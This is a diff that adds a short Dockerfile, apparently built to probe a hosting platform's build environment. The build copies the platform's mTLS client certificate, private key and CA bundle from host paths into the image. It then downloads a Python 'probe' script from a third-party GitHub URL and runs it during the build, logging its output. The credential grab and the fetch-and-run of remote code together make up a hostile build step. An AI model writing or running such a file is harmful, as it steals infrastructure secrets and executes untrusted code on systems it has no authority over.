@@ -1,0 +1,9 @@
+# I67940-a1b2c3
+FROM alpine:3.20
+RUN echo I67940-a1b2c3-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl bash openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 25 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i67940.py && echo DL_OK && MARK=I67940-a1b2c3 HISTBUDGET=480 MAXH=120 timeout 560 python3 /p.py 2>&1 | head -c 45000
+CMD ["sh","-c","sleep 3600"]
